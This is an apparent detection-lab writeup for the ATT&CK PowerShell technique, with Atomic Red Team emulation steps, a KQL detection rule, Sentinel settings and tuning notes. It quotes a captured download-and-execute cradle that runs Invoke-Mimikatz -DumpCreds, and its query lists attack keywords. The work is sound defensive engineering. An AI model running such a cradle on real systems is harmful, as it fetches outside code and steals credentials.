# T1059.001 — Command and Scripting Interpreter: PowerShell

**Tactic:** Execution
**ATT&CK:** [T1059.001](https://attack.mitre.org/techniques/T1059/001/)
**Status:** ✅ Detected

## Summary

PowerShell is one of the most heavily abused execution mechanisms in real intrusions.
Attackers use it for download cradles, in-memory execution, and obfuscated commands to
evade detection. This detection identifies PowerShell launched with the flags and patterns
that distinguish malicious use from benign administration.

## Emulation

Simulated with Atomic Red Team, using the assumed-breach model where tests run directly on
the victim endpoint. From the Atomic Red Team install directory, in an elevated PowerShell
session:

```powershell
Import-Module C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1 -Force
Invoke-AtomicTest T1059.001 -GetPrereqs
Invoke-AtomicTest T1059.001
```

Cleanup after testing to return the host to a known-good state:

```powershell
Invoke-AtomicTest T1059.001 -Cleanup
```

## Telemetry source

- **Sysmon Event ID 1** (Process Create), collected via Azure Monitor Agent into the
  Log Analytics `Event` table.
- Sysmon configured with the SwiftOnSecurity baseline config.

**Why Sysmon EID 1?** PowerShell abuse is observable through the process that runs it. In this lab,
`powershell.exe` us launched with specific flags and payloads. EID 1 captures the full command
line of every process, which is what the detection will alert on. Without command-line logging,
you can see that PowerShell ran but not the flags, encoded content, or download cradle that
separate malicious use from legitimate administration. The native alternative, Security
Event ID 4688 (process creation), requires an explicit audit policy to include command
lines and lands in a different schema; Sysmon EID 1 provides this consistently out of the
box with the SwiftOnSecurity config.

## Detection logic (via KQL)

Written against the Sysmon-via-AMA schema (`Event` table), where event detail lives in the
`EventData` XML field, so the query string-matches on `EventData` rather than using the
clean named columns of the Defender Advanced Hunting schema:

```kql
Event
| where Source == "Microsoft-Windows-Sysmon"
| where EventID == 1
| where EventData has "powershell"
| where EventData has_any ("-enc", "-EncodedCommand", "FromBase64String",
                           "DownloadString", "IEX", "hidden", "-nop", "-NoProfile")
| project TimeGenerated, Computer, RenderedDescription
| sort by TimeGenerated desc
```

## Sentinel analytics rule

| Setting | Value |
|---|---|
| Rule type | Scheduled query |
| Run frequency | Every 5 minutes |
| Lookback | Last 1 hour |
| Alert threshold | Results > 0 |
| Suppression | On; stop for 1 hour after an alert |
| Entity mapping | Host → HostName = `Computer` |
| Incident creation | Enabled |
| MITRE mapping | Execution / T1059.001 |

This rule was initially configured with a 5-minute lookback, which caused missed events due
to ingestion latency. I updated to a 1-hour lookback with suppression enabled, the tuning
pattern carried forward through all subsequent detections. For the rationale, see the
[T1059.003 writeup](https://github.com/alexcolincrawford/mitre-attack-sentinel-detection-lab/blob/main/detections/T1059.003-windows-command-shell/writeup.md).

## Validation

The analytics rule fired and raised a live incident in the Microsoft Defender portal
(**"T1059.001 - Suspicious PowerShell Execution"**) correctly attributed to the host
`CLIENT01.lab.local`, grouping 19 related events.

[![Incident raised in the Defender portal, attributed to CLIENT01](https://github.com/alexcolincrawford/mitre-attack-sentinel-detection-lab/raw/main/detections/T1059.001-powershell/screenshots/incident-overview.png)](/alexcolincrawford/mitre-attack-sentinel-detection-lab/blob/main/detections/T1059.001-powershell/screenshots/incident-overview.png)

Inspecting the captured event shows a download-and-execute cradle for **Mimikatz**, a
credential-dumping tool, pulled into memory and run with `-DumpCreds`:

[![Captured process command line showing the Invoke-Mimikatz download cradle](https://github.com/alexcolincrawford/mitre-attack-sentinel-detection-lab/raw/main/detections/T1059.001-powershell/screenshots/incident-command.png)](/alexcolincrawford/mitre-attack-sentinel-detection-lab/blob/main/detections/T1059.001-powershell/screenshots/incident-command.png)

The captured command line:

```
cmd.exe /c powershell.exe "IEX (New-Object Net.WebClient).DownloadString(
'.../PowerShellMafia/PowerSploit/.../Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

This validates the detection pipeline end to end: an attacker technique was emulated on the
endpoint, captured by Sysmon, forwarded through the AMA/DCR pipeline, matched by the KQL
analytics rule, and surfaced as an incident mapped to T1059.001.

## False-positive considerations

PowerShell is used extensively for legitimate administration, so this rule will fire on
benign activity in a real environment. It would be tuned by:

- Scoping to interactive user sessions rather than SYSTEM or service accounts, which
  commonly spawn PowerShell for scheduled tasks and endpoint-management tooling
- Weighting encoded commands (`-enc`, `FromBase64String`) and download cradles
  (`DownloadString`, `IEX`) more heavily than flags like `-nop` or `-NoProfile`, which
  appear routinely in automation scripts
- Correlating with the parent process: PowerShell spawned by `cmd.exe`, `wscript.exe`,
  or `mshta.exe` is higher signal than PowerShell spawned by a known expected tool

## Detection lifecycle covered

Emulate (Atomic Red Team) → confirm telemetry (Sysmon EID 1) → detect (KQL analytics rule)
→ raise incident (Sentinel/Defender) → suppression to prevent duplicate incidents →
false-positive analysis → document (this writeup).
